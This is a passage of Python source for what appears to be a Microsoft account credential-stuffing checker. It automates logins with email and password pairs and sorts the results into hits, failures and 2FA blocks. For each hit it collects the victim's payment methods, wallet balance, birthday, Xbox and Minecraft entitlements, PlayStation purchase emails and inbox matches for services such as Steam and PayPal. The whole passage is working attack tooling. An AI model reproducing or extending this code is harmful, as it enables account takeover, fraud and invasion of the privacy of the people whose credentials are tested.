            if "BUSINESS" in s:
                return "Office 365 Business"
            if "PERSONAL" in s:
                return "Microsoft 365 Personal"
            return "Office 365"
        if any(k in s for k in ("POWER_BI", "POWERBI", "PBI_")):
            if "PREMIUM" in s:
                return "Power BI Premium"
            return "Power BI Pro"
        if "VISIO" in s:
            if "PLAN2" in s or "CLIENT" in s:
                return "Visio Plan 2"
            return "Visio Plan 1"
        if "PROJECT" in s:
            if "PREMIUM" in s:
                return "Project Plan 5"
            if "PROFESSIONAL" in s:
                return "Project Plan 3"
            return "Project Online"
        if "DEFENDER" in s or "ATP" in s:
            return "Microsoft Defender"
        if "AAD_PREMIUM" in s or "ENTRA" in s:
            return "Entra ID Premium"
        if "INTUNE" in s:
            return "Microsoft Intune"
        if "ONEDRIVE" in s:
            return "OneDrive"
        if "EXCHANGE" in s:
            return "Exchange Online"
        if "SHAREPOINT" in s:
            return "SharePoint Online"
        if "TEAMS" in s:
            return "Microsoft Teams"
        # fallback: return prettified original
        return sku.replace("_", " ").title()

    def _get_xbox_auth(self, access_token: str):
        """Exchange MS access token for Xbox Live XSTS token. Returns (xsts_token, user_hash)."""
        try:
            r1 = self.session.post(
                "https://user.auth.xboxlive.com/user/authenticate",
                json={
                    "Properties": {
                        "AuthMethod": "RPS",
                        "SiteName": "user.auth.xboxlive.com",
                        "RpsTicket": f"d={access_token}",
                    },
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT",
                },
                headers={"Content-Type": "application/json", "Accept": "application/json"},
                timeout=10,
            )
            if r1.status_code != 200:
                return None, None
            xbl_data = r1.json()
            xbl_token = xbl_data["Token"]
            user_hash = xbl_data["DisplayClaims"]["xui"][0]["uhs"]
        except Exception:
            return None, None

        try:
            r2 = self.session.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json={
                    "Properties": {
                        "SandboxId": "RETAIL",
                        "UserTokens": [xbl_token],
                    },
                    "RelyingParty": "http://xboxlive.com",
                    "TokenType": "JWT",
                },
                headers={"Content-Type": "application/json", "Accept": "application/json"},
                timeout=10,
            )
            if r2.status_code != 200:
                return None, None
            xsts_token = r2.json()["Token"]
            return xsts_token, user_hash
        except Exception:
            return None, None

    # Container ID fragments → subscription name (Xbox licensing API)
    _GP_CONTAINER_MAP = [
        # Ultimate (check before broader keys)
        ("xgpu",                    "Xbox Game Pass Ultimate"),
        ("game_pass_ultimate",      "Xbox Game Pass Ultimate"),
        ("gamepassultimate",        "Xbox Game Pass Ultimate"),
        ("gpu_",                    "Xbox Game Pass Ultimate"),
        ("gppu",                    "Xbox Game Pass Ultimate"),
        ("gppcu",                   "Xbox Game Pass Ultimate"),
        # PC
        ("xgppc",                   "Xbox Game Pass for PC"),
        ("game_pass_pc",            "Xbox Game Pass for PC"),
        ("gamepasspc",              "Xbox Game Pass for PC"),
        ("gppc",                    "Xbox Game Pass for PC"),
        # Core (formerly Gold)
        ("xgpcore",                 "Xbox Game Pass Core"),
        ("game_pass_core",          "Xbox Game Pass Core"),
        ("gamepasscore",            "Xbox Game Pass Core"),
        ("gpcore",                  "Xbox Game Pass Core"),
        # Console
        ("xgpconsole",              "Xbox Game Pass Console"),
        ("game_pass_console",       "Xbox Game Pass Console"),
        ("gamepassconsole",         "Xbox Game Pass Console"),
        # Xbox Live Gold (legacy)
        ("xbox_live_gold",          "Xbox Live Gold"),
        ("xboxlive_gold",           "Xbox Live Gold"),
        ("xbl_gold",                "Xbox Live Gold"),
        ("gold_",                   "Xbox Live Gold"),
        # EA Play (bundled with Ultimate)
        ("ea_play",                 "EA Play"),
        ("eaplay",                  "EA Play"),
    ]

    # Known product name fragments → normalized label
    _SUB_NAME_NORM = [
        ("game pass ultimate",      "Xbox Game Pass Ultimate"),
        ("game pass for pc",        "Xbox Game Pass for PC"),
        ("game pass pc",            "Xbox Game Pass for PC"),
        ("game pass core",          "Xbox Game Pass Core"),
        ("game pass console",       "Xbox Game Pass Console"),
        ("game pass",               "Xbox Game Pass"),
        ("xbox live gold",          "Xbox Live Gold"),
        ("xbox gold",               "Xbox Live Gold"),
        ("microsoft 365 personal",  "Microsoft 365 Personal"),
        ("microsoft 365 family",    "Microsoft 365 Family"),
        ("microsoft 365 business",  "Microsoft 365 Business"),
        ("microsoft 365",           "Microsoft 365"),
        ("office 365",              "Office 365"),
        ("office365",               "Office 365"),
        ("ea play",                 "EA Play"),
        ("onedrive",                "OneDrive"),
        ("azure",                   "Azure"),
    ]

    def _normalize_sub_name(self, name: str) -> str:
        """Normalize a raw subscription display name to a clean label."""
        if not name:
            return name
        low = name.strip().lower()
        for fragment, label in self._SUB_NAME_NORM:
            if fragment in low:
                return label
        # Capitalize nicely if it's an all-caps SKU string
        if name == name.upper() and "_" in name:
            return self._classify_sku(name)
        return name.strip()

    def _check_xbox_gamepass_api(self, access_token: str) -> List[str]:
        """Query Xbox Live subscription APIs to detect active subscriptions."""
        results: List[str] = []
        xsts_token, user_hash = self._get_xbox_auth(access_token)
        if not xsts_token or not user_hash:
            return results

        auth_header = f"XBL3.0 x={user_hash};{xsts_token}"
        xbl_headers = {
            "Authorization": auth_header,
            "x-xbl-contract-version": "8",
            "Accept": "application/json",
            "Accept-Language": "en-US",
        }

        dead_statuses = {"cancelled", "expired", "disabled", "failed", "inactive"}

        # ── Source 1: subscription.mp.microsoft.com ───────────────────────────
        for sub_url in [
            "https://subscription.mp.microsoft.com/v2.0/users/me/subscriptions",
            "https://subscription.mp.microsoft.com/v8.0/users/me/subscriptions",
            "https://subscription.mp.microsoft.com/v2.0/subscriptions",
        ]:
            try:
                r = self.session.get(sub_url, headers=xbl_headers, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    subs = (data.get("subscriptions") or data.get("items") or
                            data.get("value") or [])
                    for sub in subs:
                        status = str(
                            sub.get("status") or sub.get("subscriptionStatus") or
                            sub.get("state") or ""
                        ).lower()
                        if status and status in dead_statuses:
                            continue
                        raw = (sub.get("productName") or sub.get("displayName") or
                               sub.get("friendlyName") or sub.get("skuId") or "")
                        name = self._normalize_sub_name(raw)
                        if name and name not in results:
                            results.append(name)
                    if results:
                        break
            except Exception:
                continue

        # ── Source 2: licensing.mp.microsoft.com containers ──────────────────
        try:
            r2 = self.session.get(
                "https://licensing.mp.microsoft.com/v8.0/users/me/containers/ids",
                headers=xbl_headers,
                timeout=10,
            )
            if r2.status_code == 200:
                data = r2.json()
                containers = data.get("containers") or data.get("value") or []
                for c in containers:
                    cid = str(c.get("id") or c.get("containerId") or c.get("skuId") or "").lower()
                    if not cid:
                        continue
                    for key, label in self._GP_CONTAINER_MAP:
                        if key in cid and label not in results:
                            results.append(label)
                            break
        except Exception:
            pass

        # ── Source 3: xblmessaging / entitlements (additional signals) ────────
        try:
            r3 = self.session.get(
                "https://entitlements.xboxlive.com/users/me/subscriptions",
                headers=xbl_headers,
                timeout=10,
            )
            if r3.status_code == 200:
                data = r3.json()
                subs = data.get("subscriptions") or data.get("value") or []
                for sub in subs:
                    status = str(sub.get("status") or "").lower()
                    if status in dead_statuses:
                        continue
                    raw = (sub.get("displayName") or sub.get("productName") or
                           sub.get("friendlyName") or "")
                    name = self._normalize_sub_name(raw)
                    if name and name not in results:
                        results.append(name)
        except Exception:
            pass

        return results

    def _get_graph_subscriptions(self, token: str) -> List[str]:
        results: List[str] = []
        headers = {"Authorization": f"Bearer {token}", "Accept": "application/json"}

        def _add(name):
            n = self._normalize_sub_name(name)
            if n and n not in results:
                results.append(n)

        # subscribedSkus — most reliable for M365/Office SKUs
        try:
            r = self.session.get(
                "https://graph.microsoft.com/v1.0/me/subscribedSkus",
                headers=headers, timeout=8
            )
            if r.status_code == 200:
                for item in r.json().get("value", []):
                    sku = item.get("skuPartNumber", "")
                    if sku:
                        _add(self._classify_sku(sku))
        except Exception:
            pass

        # licenseDetails — per-user assigned licenses
        try:
            r3 = self.session.get(
                "https://graph.microsoft.com/v1.0/me/licenseDetails",
                headers=headers, timeout=8
            )
            if r3.status_code == 200:
                for item in r3.json().get("value", []):
                    sku = item.get("skuPartNumber", "")
                    if sku:
                        _add(self._classify_sku(sku))
        except Exception:
            pass

        # subscriptions.microsoft.com entitlements
        try:
            r2 = self.session.get(
                "https://subscriptions.microsoft.com/v1/me/entitlements",
                headers=headers, timeout=8
            )
            if r2.status_code == 200:
                for item in r2.json().get("entitlements", []):
                    raw = item.get("friendlyName") or item.get("productName") or ""
                    _add(raw)
        except Exception:
            pass

        return results

    def get_microsoft_subscriptions(self, refresh_token=""):
        desktop_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        dead_statuses = {"cancelled", "expired", "disabled", "failed", "inactive", "terminated"}
        results: List[str] = []

        def _add(name):
            n = self._normalize_sub_name(name)
            if n and n not in results and n.upper() != "N/A":
                results.append(n)

        def _parse_services_json(data):
            if isinstance(data, list):
                items = data
            else:
                items = (data.get("services") or data.get("Services") or
                         data.get("subscriptions") or data.get("Subscriptions") or
                         data.get("value") or data.get("items") or [])
                if not items:
                    for v in data.values():
                        if isinstance(v, list) and v:
                            items = v
                            break
            for item in items:
                if not isinstance(item, dict):
                    continue
                status = str(
                    item.get("status") or item.get("State") or
                    item.get("subscriptionStatus") or item.get("subscriptionState") or ""
                ).lower()
                if status and status in dead_statuses:
                    continue
                sname = (item.get("productName") or item.get("friendlyName") or
                         item.get("name") or item.get("ProductName") or
                         item.get("SubscriptionName") or item.get("displayName") or
                         item.get("skuId") or "")
                _add(sname)

        api_urls = [
            "https://account.microsoft.com/api/v2/getServices",
            "https://account.microsoft.com/api/services",
            "https://account.microsoft.com/api/v1/getServices",
            "https://account.microsoft.com/api/v2/subscriptions",
            "https://account.microsoft.com/api/v1/subscriptions",
            "https://api.account.microsoft.com/v1.0/users/me/subscriptions",
        ]

        if refresh_token:
            # ── Source 1: Xbox Live (Game Pass / Gold) ─────────────────────────
            for xbox_scope in [
                "https://xboxlive.com/.default",
                "service::xboxlive.com::MBI_SSL",
                "Xboxlive.signin Xboxlive.offline_access",
            ]:
                xbox_token = self._get_token_for_scope(refresh_token, xbox_scope)
                if xbox_token:
                    for sub in self._check_xbox_gamepass_api(xbox_token):
                        _add(sub)
                    break

            # ── Source 2: Graph API (Microsoft 365 / Office SKUs) ──────────────
            graph_token = self._get_token_for_scope(
                refresh_token, "https://graph.microsoft.com/.default"
            )
            if graph_token:
                for sub in self._get_graph_subscriptions(graph_token):
                    _add(sub)

            # ── Source 3: account.microsoft.com REST APIs ──────────────────────
            for scope in [
                "https://account.microsoft.com/.default",
                "service::account.microsoft.com::MBI_SSL",
                "wl.basic wl.emails wl.signin",
            ]:
                acct_token = self._get_token_for_scope(refresh_token, scope)
                if not acct_token:
                    continue
                auth_headers = {
                    "Authorization": f"Bearer {acct_token}",
                    "User-Agent": desktop_ua,
                    "Accept": "application/json",
                }
                for api_url in api_urls:
                    try:
                        ar = self.session.get(api_url, headers=auth_headers, timeout=8)
                        if ar.status_code == 200:
                            _parse_services_json(ar.json())
                    except Exception:
                        continue
                if results:
                    break

            if results:
                return results

        # Fallback: load the services page and scrape or call API sessionlessly
        try:
            sso_r = self.session.get(
                "https://account.microsoft.com/services",
                headers={"User-Agent": desktop_ua, "Accept": "text/html,*/*"},
                timeout=12,
                allow_redirects=True
            )
            if sso_r.status_code == 200:
                api_headers = {"User-Agent": desktop_ua, "Accept": "application/json"}
                for api_url in api_urls[:4]:
                    try:
                        ar = self.session.get(api_url, headers=api_headers, timeout=8)
                        if ar.status_code == 200:
                            _parse_services_json(ar.json())
                            if results:
                                return results
                    except Exception:
                        continue

                page_text = sso_r.text
                for pat in [
                    r'"productName"\s*:\s*"([^"]{3,80})"',
                    r'"friendlyName"\s*:\s*"([^"]{3,80})"',
                    r'"SubscriptionName"\s*:\s*"([^"]{3,80})"',
                    r'"subscriptionName"\s*:\s*"([^"]{3,80})"',
                    r'"displayName"\s*:\s*"([^"]{3,80})"',
                ]:
                    for match in re.findall(pat, page_text):
                        _add(match)
                if results:
                    return list(dict.fromkeys(results))
        except Exception:
            pass

        return ["N/A"]

    def get_wallet_balance(self, token, refresh_token=""):
        desktop_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

        def _try(auth_token):
            h = {
                "Authorization": f"Bearer {auth_token}",
                "User-Agent": desktop_ua,
                "Accept": "application/json",
            }
            for url in [
                "https://api.account.microsoft.com/users/me/wallet",
                "https://account.microsoft.com/api/v1/wallet",
                "https://account.microsoft.com/api/v2/wallet",
                "https://account.microsoft.com/api/v1/walletBalance",
            ]:
                try:
                    r = self.session.get(url, headers=h, timeout=6)
                    if r.status_code == 200:
                        d = r.json()
                        amount = (d.get("balance") or d.get("amount") or
                                  d.get("totalBalance") or d.get("availableBalance") or "")
                        currency = d.get("currency") or d.get("currencyCode") or ""
                        if amount not in ("", None, 0, "0"):
                            return f"{amount} {currency}".strip()
                except Exception:
                    continue
            return ""

        result = _try(token)
        if result:
            return result
        if refresh_token:
            for scope in ["https://account.microsoft.com/.default",
                          "service::account.microsoft.com::MBI_SSL"]:
                scoped = self._get_token_for_scope(refresh_token, scope)
                if scoped:
                    result = _try(scoped)
                    if result:
                        return result
        return ""

    def get_birthday(self, token, cid):
        try:
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }
            r = self.session.get(
                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                headers=headers, timeout=8
            )
            if r.status_code == 200:
                data = r.json()
                bday = (data.get("birthday") or data.get("birthDate") or
                        data.get("dateOfBirth") or "")
                if bday:
                    date_str = bday.split("T")[0]
                    birth_date = datetime.strptime(date_str, "%Y-%m-%d")
                    today = datetime.now()
                    age = (today.year - birth_date.year -
                           ((today.month, today.day) < (birth_date.month, birth_date.day)))
                    return {"birthday": birth_date.strftime("%Y-%m-%d"), "age": str(age)}
        except Exception:
            pass
        return {"birthday": "", "age": ""}

    def check_psn_purchases(self, token, cid):
        try:
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": (
                        "from:sony@txn-email.playstation.com OR "
                        "from:sony@email02.account.sony.com OR "
                        "\"PlayStation Order\" OR \"Your PlayStation order\""
                    )},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Content-Type": "application/json",
            }
            r = self.session.post(
                "https://outlook.live.com/search/api/v2/query",
                json=payload, headers=headers, timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                purchases = []
                total_orders = 0
                try:
                    result_set = data["EntitySets"][0]["ResultSets"][0]
                    total_orders = result_set.get("Total", 0)
                    for item in result_set.get("Results", [])[:10]:
                        purchase = {}
                        preview = item.get("Preview", "")
                        for pattern in [
                            r"Thank you for purchasing\s+([^\.]+)",
                            r"You've bought\s+([^\.]+)",
                            r"purchased\s+([^\.]+)",
                            r"Game:\s*([^\n]+)",
                        ]:
                            match = re.search(pattern, preview, re.IGNORECASE)
                            if match:
                                purchase["item"] = match.group(1).strip()[:60]
                                break
                        price_match = re.search(r"[\$€£¥]\s*\d+[\.,]\d{2}", preview)
                        if price_match:
                            purchase["price"] = price_match.group(0)
                        recv = (item.get("ReceivedTime") or
                                item.get("Source", {}).get("DateTimeReceived", ""))
                        if recv:
                            try:
                                date_obj = datetime.fromisoformat(recv.replace("Z", "+00:00"))
                                purchase["date"] = date_obj.strftime("%Y-%m-%d")
                            except Exception:
                                pass
                        if purchase.get("item"):
                            purchases.append(purchase)
                except (KeyError, IndexError):
                    pass
                return {"psn_orders": total_orders, "purchases": purchases}
        except Exception:
            pass
        return {"psn_orders": 0, "purchases": []}

    def check_minecraft_entitlements(self, email: str, password: str) -> List[str]:
        """
        Detect Xbox Game Pass / Minecraft products via Minecraft entitlements API.
        Uses the old Xbox RPS login flow (login.live.com, client 00000000402B5328)
        in a separate session so the main Outlook session cookies are not disturbed.
        """
        XBX_CLIENT   = "00000000402B5328"
        SFT_URL = (
            "https://login.live.com/oauth20_authorize.srf"
            f"?client_id={XBX_CLIENT}"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        )
        UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36")
        sess = requests.Session()
        sess.verify = False
        sess.headers.update({"User-Agent": UA})
        try:
            # ── Step 0: Get PPFT / urlPost from login.live.com ────────────────
            r0 = sess.get(SFT_URL, timeout=12, allow_redirects=True)
            text = r0.text
            ppft = None
            for pat in [
                re.compile(r'value=\\"(.+?)\\"', re.S),
                re.compile(r'name="PPFT"[^>]*value="([^"]*)"', re.S),
                re.compile(r'sFT:"(.*?)"'),
            ]:
                m = pat.search(text)
                if m:
                    ppft = m.group(1)
                    break

            url_post = None
            for pat in [
                re.compile(r'"urlPost":"(.+?)"', re.S),
                re.compile(r"urlPost:'(.+?)'"),
            ]:
                m = pat.search(text)
                if m:
                    url_post = m.group(1).replace("&amp;", "&")
                    break

            if not ppft or not url_post:
                return []

            # ── Step 1: Post credentials ──────────────────────────────────────
            data = {"login": email, "loginfmt": email, "passwd": password, "PPFT": ppft}
            login_r = sess.post(
                url_post, data=data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                allow_redirects=True, timeout=12,
            )

            # Extract Xbox RPS access_token from redirect URL fragment
            frag = parse_qs(urlparse(login_r.url).fragment)
            rps_token = frag.get("access_token", [None])[0]
            if not rps_token:
                return []     # Bad / 2FA / network issue — nothing to do

            # ── Step 2: Xbox Live auth (RPS token, no "d=" prefix) ────────────
            r1 = sess.post(
                "https://user.auth.xboxlive.com/user/authenticate",
                json={
                    "Properties": {
                        "AuthMethod": "RPS",
                        "SiteName": "user.auth.xboxlive.com",
                        "RpsTicket": rps_token,   # old flow: no d= prefix
                    },
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT",
                },
                headers={"Content-Type": "application/json", "Accept": "application/json"},
                timeout=10,
            )
            if r1.status_code != 200:
                return []
            xbl_data  = r1.json()
            xbl_token = xbl_data["Token"]
            uhs       = xbl_data["DisplayClaims"]["xui"][0]["uhs"]

            # ── Step 3: XSTS with Minecraft relying party ─────────────────────
            r2 = sess.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json={
                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
                    "RelyingParty": "rp://api.minecraftservices.com/",
                    "TokenType": "JWT",
                },
                headers={"Content-Type": "application/json", "Accept": "application/json"},
                timeout=10,
            )
            if r2.status_code != 200:
                return []
            xsts_token = r2.json().get("Token")
            if not xsts_token:
                return []

            # ── Step 4: Minecraft access token ────────────────────────────────
            mc_r = sess.post(
                "https://api.minecraftservices.com/authentication/login_with_xbox",
                json={"identityToken": f"XBL3.0 x={uhs};{xsts_token}"},
                headers={"Content-Type": "application/json"},
                timeout=10,
            )
            if mc_r.status_code != 200:
                return []
            mc_access = mc_r.json().get("access_token")
            if not mc_access:
                return []

            # ── Step 5: Query entitlements ────────────────────────────────────
            ent_r = sess.get(
                "https://api.minecraftservices.com/entitlements/mcstore",
                headers={"Authorization": f"Bearer {mc_access}"},
                timeout=10,
            )
            if ent_r.status_code != 200:
                return []

            text = ent_r.text
            owned: List[str] = []
            if "product_game_pass_ultimate" in text:
                owned.append("Xbox Game Pass Ultimate")
            if "product_game_pass_pc" in text and "product_game_pass_ultimate" not in text:
                owned.append("Xbox Game Pass for PC")
            if "product_game_pass_core" in text:
                owned.append("Xbox Game Pass Core")
            if "product_game_pass_console" in text:
                owned.append("Xbox Game Pass Console")
            if '"product_minecraft"' in text:
                owned.append("Minecraft Java")
            if "product_minecraft_bedrock" in text:
                owned.append("Minecraft Bedrock")
            if "product_legends" in text:
                owned.append("Minecraft Legends")
            if "product_dungeons" in text:
                owned.append("Minecraft Dungeons")
            return owned
        except Exception:
            return []
        finally:
            sess.close()

    def check_inbox_keywords(self, token, cid):
        """Search inbox by keywords (Steam, Netflix, PayPal, etc.) and return totals."""
        try:
            url = "https://outlook.live.com/search/api/v2/query?n=124"
            headers = {
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Content-Type": "application/json",
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
            }
            found_info = []
            total_found_sum = 0
            for keyword in INBOX_KEYWORDS:
                try:
                    payload = {
                        "Cvid": str(uuid.uuid4()),
                        "Scenario": {"Name": "owa.react"},
                        "TimeZone": "UTC",
                        "TextDecorations": "Off",
                        "EntityRequests": [{
                            "EntityType": "Conversation",
                            "ContentSources": ["Exchange"],
                            "Filter": {"Or": [
                                {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                            ]},
                            "From": 0,
                            "Query": {"QueryString": keyword},
                            "Size": 25,
                            "EnableTopResults": True,
                            "TopResultsCount": 3,
                        }],
                        "AnswerEntityRequests": [{
                            "Query": {"QueryString": keyword},
                            "EntityTypes": ["Event", "File"],
                            "From": 0,
                            "Size": 10,
                            "EnableAsyncResolution": True,
                        }],
                        "QueryAlterationOptions": {
                            "EnableSuggestion": True,
                            "EnableAlteration": True,
                        },
                    }
                    r = self.session.post(url, json=payload, headers=headers, timeout=10)
                    if r.status_code == 200:
                        data = r.json()
                        total = 0
                        if "EntitySets" in data:
                            for entity_set in data["EntitySets"]:
                                if "ResultSets" in entity_set:
                                    for result_set in entity_set["ResultSets"]:
                                        if "Total" in result_set:
                                            total = result_set["Total"]
                                        elif "ResultCount" in result_set:
                                            total = result_set["ResultCount"]
                                        elif "Results" in result_set:
                                            total = len(result_set["Results"])
                        if total > 0:
                            total_found_sum += total
                            found_info.append(f"{keyword} ({total})")
                except Exception:
                    continue
            return total_found_sum, found_info
        except Exception:
            return 0, []

    def search_emails_by_sender(self, token, cid, email, password, id_token="", refresh_token=""):
        url = "https://outlook.live.com/search/api/v2/query?n=400&cv=tNZ1DVP5NhDwG%2FDUCelaIu.400"
        query_string = " OR ".join(f"from:{pattern}" for pattern in SENDER_PATTERNS)

        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Message",
                "ContentSources": ["Exchange"],
                "Query": {"QueryString": query_string},
                "Size": 400,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                "EnableTopResults": False
            }],
            "AnswerEntityRequests": [],
            "QueryAlterationOptions": {"EnableSuggestion": False, "EnableAlteration": False}
        }

        headers = {
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Connection": "keep-alive"
        }

        # Run all account-enrichment API calls in parallel to save time
        with ThreadPoolExecutor(max_workers=8) as _enricher:
            f_profile      = _enricher.submit(self.get_account_profile, token, id_token, refresh_token)
            f_payment      = _enricher.submit(self.get_payment_methods, token, refresh_token)
            f_ms_subs      = _enricher.submit(self.get_microsoft_subscriptions, refresh_token)
            f_balance      = _enricher.submit(self.get_wallet_balance, token, refresh_token)
            f_birthday     = _enricher.submit(self.get_birthday, token, cid)
            f_psn          = _enricher.submit(self.check_psn_purchases, token, cid)
            f_keywords     = _enricher.submit(self.check_inbox_keywords, token, cid)
            f_mc           = _enricher.submit(self.check_minecraft_entitlements, email, password)
            try:
                profile        = f_profile.result(timeout=30)
            except Exception:
                profile        = {"name": "N/A", "region": "N/A"}
            try:
                payment_methods = f_payment.result(timeout=15)
            except Exception:
                payment_methods = ["N/A"]
            try:
                ms_subscriptions = f_ms_subs.result(timeout=30)
            except Exception:
                ms_subscriptions = ["N/A"]
            try:
                balance        = f_balance.result(timeout=15)
            except Exception:
                balance        = ""
            try:
                birthday_info  = f_birthday.result(timeout=10)
            except Exception:
                birthday_info  = {"birthday": "", "age": ""}
            try:
                psn_info       = f_psn.result(timeout=15)
            except Exception:
                psn_info       = {"psn_orders": 0, "purchases": []}
            try:
                kw_total, kw_hits = f_keywords.result(timeout=60)
            except Exception:
                kw_total, kw_hits = 0, []
            try:
                mc_products    = f_mc.result(timeout=20)
            except Exception:
                mc_products    = []

        try:
            r = self.session.post(url, json=payload, headers=headers, timeout=8)
            if r.status_code == 200:
                data = r.json()
                try:
                    results = data['EntitySets'][0]['ResultSets'][0]['Results']
                except (KeyError, IndexError):
                    results = []

                platform_counts = {}
                platform_subjects: Dict[str, List[str]] = {}
                hit_details = []

                for item in results:
                    source = item.get('Source', {})
                    subject = source.get('Subject') or "No Subject"

                    sender_address = "Unknown"
                    if 'Sender' in source and 'EmailAddress' in source['Sender']:
                        sender_address = source['Sender']['EmailAddress'].get('Address', 'Unknown')

                    platform = resolve_sender_platform(sender_address)
                    # Fallback: if sender wasn't recognized, try subject keywords
                    if platform == sender_address:
                        platform = resolve_by_subject(subject) or platform
                    platform_counts[platform] = platform_counts.get(platform, 0) + 1
                    if platform not in platform_subjects:
                        platform_subjects[platform] = []
                    platform_subjects[platform].append(subject)
                    hit_details.append({"sender": sender_address, "subject": subject})

                platform_subscriptions: Dict[str, str] = {}
                for plat in PREMIUM_PLATFORMS:
                    if plat in platform_subjects:
                        tier = detect_subscription(plat, platform_subjects[plat])
                        platform_subscriptions[plat] = tier if tier else "✓"

                status = "HIT" if (results or kw_total > 0) else "FREE"
                return {
                    "status": status,
                    "platform_counts": platform_counts,
                    "platform_subscriptions": platform_subscriptions,
                    "details": hit_details[:10],
                    "name": profile["name"],
                    "region": profile["region"],
                    "payment_methods": payment_methods,
                    "ms_subscriptions": ms_subscriptions,
                    "balance": balance,
                    "birthday": birthday_info.get("birthday", ""),
                    "age": birthday_info.get("age", ""),
                    "psn_orders": psn_info.get("psn_orders", 0),
                    "psn_purchases": psn_info.get("purchases", []),
                    "kw_total": kw_total,
                    "kw_hits": kw_hits,
                    "mc_products": mc_products,
                }
            else:
                return {"status": "ERROR_API"}
        except Exception:
            return {"status": "ERROR_API"}

    def _do_check_backup(self, email, password):
        """Backup login via Xbox Live / Windows Live flow. Used when main OAuth fails."""
        try:
            self.session.cookies.clear()
            sft_url = (
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=00000000402B5328"
                "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                "&display=touch&response_type=token&locale=en"
            )
            headers_get = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            }
            r0 = self.session.get(sft_url, headers=headers_get, timeout=10, verify=False)
            text = r0.text

            ppft = None
            for pat in [
                re.compile(r'value=\\"(.+?)\\"', re.S),
                re.compile(r'name="PPFT".*?value="([^"]*)"', re.S),
                re.compile(r'sFT:"(.*?)"'),
            ]:
                m = pat.search(text)
                if m:
                    ppft = m.group(1)
                    break

            url_post = None
            for pat in [
                re.compile(r'"urlPost":"(.+?)"', re.S),
                re.compile(r"urlPost:'(.+?)'"),
                re.compile(r'<form[^>]+action="([^"]+)"', re.S),
            ]:
                m = pat.search(text)
                if m:
                    url_post = m.group(1).replace("&amp;", "&")
                    break

            if not ppft or not url_post:
                return None

            data = {"login": email, "loginfmt": email, "passwd": password, "PPFT": ppft}
            headers_post = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Connection": "close",
            }
            login_r = self.session.post(
                url_post, data=data, headers=headers_post,
                allow_redirects=True, timeout=12, verify=False
            )

            text_lower = login_r.text.lower()

            twofa_signals = ['recover?mkt', 'account.live.com/identity/confirm', 'Email/Confirm', '/Abuse?mkt=']
            if any(v in login_r.text for v in twofa_signals):
                return "2FA"

            bad_signals = ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist"]
            if any(v in text_lower for v in bad_signals):
                return "BAD"

            # Check for successful login (access_token in fragment)
            login_ok = (
                ('#' in login_r.url and login_r.url != sft_url and
                 parse_qs(urlparse(login_r.url).fragment).get('access_token'))
            )

            if not login_ok:
                # Last resort: see if session cookies suggest authenticated state
                if not any(c in self.session.cookies for c in ['MSPCID', 'MSPShared', 'MSPSoftVis', 'ANON']):
                    return None  # Not logged in
                # Cookies suggest session — try getting inbox token anyway

            return self._backup_get_inbox(email, password)

        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            return None
        except Exception:
            return None

    def _backup_get_inbox(self, email, password):
        """After backup login, acquire substrate token and run keyword inbox search."""
        try:
            scope = "https://substrate.office.com/User-Internal.ReadWrite"
            client_id = "0000000048170EF2"
            auth_url = (
